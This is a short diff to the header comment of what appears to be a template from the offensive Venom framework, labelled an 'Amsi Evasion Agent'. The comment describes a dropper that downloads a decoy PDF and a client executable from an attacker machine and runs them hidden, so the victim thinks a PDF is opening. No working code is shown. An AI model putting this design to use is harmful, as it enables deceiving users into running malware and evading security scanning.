@@ -1,6 +1,6 @@
 /*
 Author: r00t-3xp10it [SSA RedTeam @2020]
-Framework: Venom v1.0.17 - Amsi Evasion Agent nº 5
+Framework: Venom v1.0.17 - Amsi Evasion - Agent nº 5
 This template its used to download/exec (Legit.pdf and Client.exe) from attacker machine (LAN)
 and execute them in separated processes (hidden). Given the false sensation to target user that
 he is opening an pdf document when in reality he is executing an binary.exe with one PDF Icon.
